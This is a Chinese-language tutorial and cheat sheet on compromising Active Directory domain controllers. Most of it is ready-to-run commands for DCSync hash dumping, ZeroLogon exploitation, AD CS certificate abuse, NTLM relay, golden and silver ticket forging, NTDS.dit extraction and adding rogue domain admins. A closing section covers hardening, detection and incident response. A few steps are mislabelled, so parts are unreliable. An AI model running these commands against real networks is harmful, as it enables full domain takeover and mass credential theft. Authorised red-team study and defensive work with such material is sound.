# 域控制器攻击

## 1. 域控制器攻击概述

### 1.1 为什么攻击域控制器

域控制器（Domain Controller，DC）是Active Directory环境的核心，存储着所有域用户凭证、组策略和信任关系。攻陷域控制器意味着：

- 获取所有域用户凭证
- 完全控制域环境
- 可能扩展到整个林
- 建立持久化统治

### 1.2 常见攻击路径

```
初始访问 → 权限提升 → 横向移动 → 域控制器攻击
                                        ↓
                                   域控制权获取
                                        ↓
                                   凭证窃取/持久化
```

**主要攻击技术：**
- DCSync攻击（复制同步）
- ZeroLogon漏洞利用
- AD CS证书服务滥用
- 黄金/白银票据攻击
- NTDS.dit数据库提取

## 2. DCSync攻击

### 2.1 原理说明

DCSync是一种模拟域控制器复制行为的攻击技术。攻击者通过调用DRS（Directory Replication Service）远程协议，模拟域控制器向真实DC请求复制数据，从而获取所有用户密码哈希。

**必要权限：**
- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All
- DS-Replication-Get-Changes-In-Filtered-Set

**默认拥有权限的主体：**
- Domain Admins
- Enterprise Admins
- Domain Controllers

### 2.2 Mimikatz DCSync

**基本使用：**
```powershell
# 导出域内所有用户哈希
mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" exit

# 导出特定用户哈希
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:administrator" exit

# 导出krbtgt账户（用于黄金票据）
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit

# 指定域控制器
mimikatz.exe "lsadump::dcsync /domain:corp.local /dc:dc01.corp.local /user:administrator" exit
```

**输出解读：**
```
# DCSync输出示例
** SAM ACCOUNT **: Administrator
User Name   : Administrator
SID         : S-1-5-21-...-500
Object GUID : {...}
lm hash     : (null)
ntlm-0      : 5f4d5a3b2c1e0f9a8b7c6d5e4f3a2b1c
ntlm-1      : (null)
ntlm-2      : (null)
...
```

### 2.3 Impacket secretsdump

```bash
# 使用DCSync方式导出哈希
impacket-secretsdump -just-dc corp/admin:Password123@dc01.corp.local

# 仅导出NTLM哈希
impacket-secretsdump -just-dc-ntlm corp/admin:Password123@dc01.corp.local

# 导出包含历史密码
impacket-secretsdump -just-dc-user administrator corp/admin:Password123@dc01.corp.local

# 使用哈希认证
impacket-secretsdump -hashes :5f4d5a3b2c1e0f9a8b7c6d5e4f3a2b1c -just-dc corp/admin@dc01.corp.local
```

### 2.4 权限获取与委派

**获取DCSync权限：**
```powershell
# PowerView添加DCSync权限
# 需要对域对象有WriteDACL权限
Add-ObjectAcl -TargetDistinguishedName "DC=corp,DC=local" -PrincipalIdentity attacker -Rights DCSync

# 验证权限
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | 
    Where-Object {$_.IdentityReference -match "attacker"}
```

**BloodHound发现DCSync路径：**
```cypher
// 查找具有DCSync权限的用户
MATCH (u:User)-[:DCSync]->(d:Domain) RETURN u.name, d.name

// 查找到达DCSync的攻击路径
MATCH p = shortestPath((u:User)-[*]->(d:Domain)) 
WHERE u.name = "ATTACKER@CORP.LOCAL" AND (u)-[:DCSync]->(d) 
RETURN p
```

## 3. ZeroLogon漏洞

### 3.1 漏洞概述

ZeroLogon（CVE-2020-1472）是Netlogon协议的严重漏洞，允许未经认证的攻击者将域控制器密码置空，从而完全控制域。

**漏洞原理：**
- Netlogon使用RPC协议进行域控制器认证
- 加密过程中存在缺陷，可绕过认证
- 攻击者可将DC密码设置为空

**影响范围：**
- Windows Server 2008 R2 - 2019
- 已在2020年8月补丁中修复

### 3.2 漏洞检测

**使用检测工具：**
```bash
# Impacket检测
python zerologon_tester.py DC01 192.168.1.10

# 使用Nmap脚本
nmap -p 135 --script=zerologon 192.168.1.10

# CrackMapExec检测
crackmapexec smb 192.168.1.10 -u '' -p '' -d . --zero-logon
```

### 3.3 漏洞利用

**使用Impacket：**
```bash
# 1. 检测漏洞
python zerologon_tester.py DC01 192.168.1.10

# 2. 利用漏洞（将DC密码置空）
python zerologon_exploit.py DC01 192.168.1.10

# 3. 导出哈希（使用空密码）
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/DC01$@192.168.1.10

# 4. 恢复DC密码（重要！）
python restorepassword.py DC01 192.168.1.10 -hexpass:ORIGINAL_HASH
```

**完整攻击流程：**
```bash
# 步骤1：置空DC密码
python zerologon_exploit.py DC01 192.168.1.10

# 步骤2：使用空密码获取管理员哈希
impacket-secretsdump -no-pass corp.local/'DC01$'@192.168.1.10

# 步骤3：使用管理员哈希访问DC
impacket-wmiexec -hashes :ADMIN_HASH corp.local/administrator@192.168.1.10

# 步骤4：恢复DC密码（避免破坏域）
# 从导出的哈希中获取原始机器账户密码哈希
python restorepassword.py DC01 192.168.1.10 -hexpass:ORIGINAL_HASH
```

### 3.4 防护措施

**补丁更新：**
- 安装2020年8月及之后的安全更新
- 启用强制模式（Force mode）

**检测方法：**
```powershell
# 检查Netlogon日志
Get-WinEvent -LogName "System" | Where-Object {$_.Message -match "Netlogon"}

# 检查域控制器密码最后设置时间
Get-ADComputer -Filter {Name -eq "DC01"} -Properties pwdLastSet
```

## 4. AD CS证书服务滥用

### 4.1 AD CS概述

Active Directory证书服务（AD CS）提供公钥基础设施（PKI）服务，可用于身份认证。滥用AD CS可以获取高权限证书，实现权限提升和持久化。

**关键组件：**
- 证书颁发机构（CA）
- 证书模板
- 证书注册服务

### 4.2 ESC1 - 滥用证书模板

**漏洞条件：**
- 模板允许客户端指定subjectAltName
- 模板允许注册
- 证书可用于客户端认证

**利用方法：**
```powershell
# 使用Certipy
certipy req -u user@corp.local -p Password123 -target ca01.corp.local -ca corp-CA -template VulnTemplate -upn administrator@corp.local

# 使用申请的证书认证
certipy auth -pfx administrator.pfx -domain corp.local
```

### 4.3 ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**漏洞条件：**
- CA设置EDITF_ATTRIBUTESUBJECTALTNAME2标志
- 任何模板都可指定subjectAltName

**检测与利用：**
```bash
# 检测CA配置
certipy find -u user@corp.local -p Password123 -target ca01.corp.local

# 利用ESC6
certipy req -u user@corp.local -p Password123 -target ca01.corp.local -ca corp-CA -template User -upn administrator@corp.local
```

### 4.4 ESC8 - AD CS HTTP注册

**漏洞条件：**
- 启用HTTP注册接口
- 允许NTLM认证

**利用方法：**
```bash
# 使用AD CS Relay攻击
# 1. 设置ntlmrelayx
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs

# 2. 触发认证
# 通过各种方式触发目标向攻击者发起认证

# 3. 获取证书后认证
certipy auth -pfx dc01.pfx -domain corp.local
```

### 4.5 Certipy工具使用

**信息收集：**
```bash
# 查找CA
certipy find -u user@corp.local -p Password123

# 详细信息
certipy find -u user@corp.local -p Password123 -target corp.local -text

# 查找漏洞模板
certipy find -u user@corp.local -p Password123 -vulnerable
```

**证书操作：**
```bash
# 请求证书
certipy req -u user@corp.local -p Password123 -ca corp-CA -template User

# 使用证书认证
certipy auth -pfx user.pfx -domain corp.local

# 使用证书获取TGT
certipy auth -pfx administrator.pfx -domain corp.local -dc dc01.corp.local
```

## 5. 黄金票据攻击

### 5.1 原理说明

黄金票据（Golden Ticket）是伪造的Kerberos TGT，使用krbtgt账户的密码哈希签名。由于krbtgt密码很少更改，黄金票据可长期有效。

**黄金票据特性：**
- 可伪造任意用户身份
- 可设置任意有效期（默认10年）
- 可设置任意组员身份
- 不受密码策略限制

**必要条件：**
- krbgt账户的NTLM哈希
- 域SID
- 域名

### 5.2 获取krbtgt哈希

```powershell
# 方法1：从DCSync获取
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit

# 方法2：从NTDS.dit提取
mimikatz.exe "lsadump::lsa /patch" exit

# 方法3：从内存提取（在DC上）
mimikatz.exe "sekurlsa::logonpasswords" exit
```

### 5.3 创建黄金票据

**Mimikatz创建：**
```powershell
# 获取域SID
whoami /user
# 或
Get-ADDomain | Select-Object DomainSID

# 创建黄金票据
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:Administrator /ptt" exit

# 创建带组员身份的票据
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:Administrator /groups:512,513,518,519,520 /ptt" exit

# 设置票据有效期
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:Administrator /startoffset:0 /endin:315360000 /renewmax:315360000 /ptt" exit
```

**使用票据：**
```powershell
# 注入票据后访问域资源
dir \\dc01.corp.local\c$
net use \\dc01.corp.local\c$

# 执行域管理操作
net user newuser /add /domain
net group "Domain Admins" newuser /add /domain
```

### 5.4 Rubeus创建黄金票据

```powershell
# 创建黄金票据
Rubeus.exe golden /aes256:AES256KEY /user:Administrator /domain:corp.local /sid:S-1-5-21-... /ptt

# 使用krbtgt NTLM哈希
Rubeus.exe golden /rc4:KRBTGT_HASH /user:Administrator /domain:corp.local /sid:S-1-5-21-... /ptt

# 导出票据到文件
Rubeus.exe golden /aes256:AES256KEY /user:Administrator /domain:corp.local /sid:S-1-5-21-... /outfile:golden.kirbi
```

## 6. 白银票据攻击

### 6.1 原理说明

白银票据（Silver Ticket）是伪造的Kerberos服务票据（ST），使用服务账户的密码哈希签名。白银票据只能访问特定服务，但更隐蔽。

**白银票据特性：**
- 仅访问特定服务
- 不需要与KDC交互
- 更难检测
- 需要服务账户哈希

**常见服务SPN：**
| 服务 | SPN格式 | 用途 |
|------|---------|------|
| CIFS | cifs/target | 文件共享 |
| HTTP | http/target | Web服务 |
| HOST | host/target | 多种服务 |
| LDAP | ldap/target | 目录服务 |
| MSSQL | mssqlsvc/target | SQL服务 |

### 6.2 创建白银票据

**Mimikatz创建：**
```powershell
# 获取服务账户哈希（从内存或DCSync）
mimikatz.exe "sekurlsa::logonpasswords" exit

# 创建CIFS白银票据（访问文件共享）
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:dc01.corp.local /service:cifs /rc4:SERVICE_HASH /user:Administrator /ptt" exit

# 创建HOST白银票据（多种服务）
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:dc01.corp.local /service:host /rc4:SERVICE_HASH /user:Administrator /ptt" exit

# 创建LDAP白银票据（目录服务）
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:dc01.corp.local /service:ldap /rc4:SERVICE_HASH /user:Administrator /ptt" exit
```

**使用白银票据：**
```powershell
# CIFS票据 - 访问文件共享
dir \\dc01.corp.local\c$

# HOST票据 - 计划任务等
schtasks /create /s dc01.corp.local /tn test /tr cmd.exe /sc once /st 12:00

# LDAP票据 - AD查询
Get-ADUser -Filter * -Server dc01.corp.local
```

### 6.3 Rubeus创建白银票据

```powershell
# 创建白银票据
Rubeus.exe silver /service:cifs/dc01.corp.local /rc4:SERVICE_HASH /user:Administrator /domain:corp.local /sid:S-1-5-21-... /ptt

# 使用AES密钥
Rubeus.exe silver /service:host/dc01.corp.local /aes256:AES256KEY /user:Administrator /domain:corp.local /sid:S-1-5-21-... /ptt
```

### 6.4 黄金票据 vs 白银票据

| 特性 | 黄金票据 | 白银票据 |
|------|----------|----------|
| 伪造对象 | TGT | ST |
| 需要哈希 | krbtgt哈希 | 服务账户哈希 |
| 访问范围 | 所有服务 | 特定服务 |
| KDC交互 | 需要（获取ST） | 不需要 |
| 检测难度 | 较易 | 较难 |
| 有效期 | 长期 | 较短 |

## 7. NTDS.dit数据库提取

### 7.1 NTDS.dit概述

NTDS.dit是Active Directory数据库文件，存储所有域对象和凭证信息。提取NTDS.dit可以获取所有用户哈希。

**文件位置：**
```
C:\Windows\NTDS\ntds.dit
```

**包含内容：**
- 用户账户和哈希
- 计算机账户
- 组信息
- 信任关系
- 所有AD对象

### 7.2 使用VSS卷影副本

**创建卷影副本：**
```powershell
# 创建C盘卷影副本
vssadmin create shadow /for=C:

# 列出卷影副本
vssadmin list shadows

# 复制NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# 复制SYSTEM注册表hive
reg save HKLM\SYSTEM C:\temp\system.hive
```

**使用Impacket提取：**
```bash
# 使用secretsdump提取
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

# 仅提取用户哈希
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL -outputfile hashes
```

### 7.3 使用NTDSUtil

```cmd
# 创建IFM（Install From Media）快照
ntdsutil "activate instance ntds" "ifm" "create full C:\IFM" quit quit

# IFM目录包含：
# C:\IFM\Active Directory\ntds.dit
# C:\IFM\registry\SYSTEM
```

### 7.4 Mimikatz提取

```powershell
# 在线提取（需要域管理员权限）
mimikatz.exe "lsadump::lsa /patch" exit

# 使用NTDS.dit文件提取
mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" exit

# 提取特定用户
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

### 7.5 CrackMapExec提取

```bash
# 远程导出NTDS.dit
crackmapexec smb 192.168.1.10 -u administrator -p Password123 --ntds

# 使用哈希认证
crackmapexec smb 192.168.1.10 -u administrator -H NTLMHASH --ntds

# 仅导出用户哈希
crackmapexec smb 192.168.1.10 -u administrator -p Password123 --ntds --user
```

## 8. 域控制器防御

### 8.1 加固措施

**账户安全：**
```powershell
# 定期更改krbtgt密码（建议每年）
# 使用脚本安全轮换
Reset-KrbtgtKey

# 检查高权限组成员
Get-ADGroupMember -Identity "Domain Admins"
Get-ADGroupMember -Identity "Enterprise Admins"
Get-ADGroupMember -Identity "Schema Admins"

# 清理过期账户和组
Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00
```

**系统加固：**
```powershell
# 启用Credential Guard
# 通过组策略配置

# 启用受限管理员模式
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# 禁用NTLM
# 通过组策略：网络安全: 限制NTLM: 传入NTLM流量

# 启用审核策略
auditpol /set /subcategory:"Security State Change" /success:enable /failure:enable
```

### 8.2 监控检测

**关键事件监控：**
```
# DCSync检测
事件ID 4662 - 对象操作审计
- 查找包含 "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" 的操作

# 黄金票据检测
事件ID 4624 - 登录事件
- 检查异常的票据有效期

# 计划任务创建
事件ID 4698 - 计划任务创建

# 服务创建
事件ID 7045 - 服务创建
```

**检测脚本：**
```powershell
# 检测DCSync行为
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4662} |
    Where-Object {$_.Message -match "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"} |
    Select-Object TimeCreated,Message

# 检测异常登录
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} |
    Where-Object {$_.Message -match "Logon Type:\s+3"} |
    Select-Object TimeCreated,Message -First 100
```

### 8.3 应急响应

**发现入侵后：**
```powershell
# 1. 隔离域控制器
# 断开网络连接或限制访问

# 2. 重置krbtgt密码（两次）

# 等待复制完成

# 第二次重置（清除票据历史）

# 3. 重置所有管理员密码
Get-ADGroupMember -Identity "Domain Admins" | ForEach-Object {
    Set-ADAccountPassword -Identity $_.SamAccountName -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword!" -Force)
}

# 4. 清除所有Kerberos票据
# 在所有域控制器上执行
klist purge

# 5. 审计日志分析
# 检查入侵时间线
```
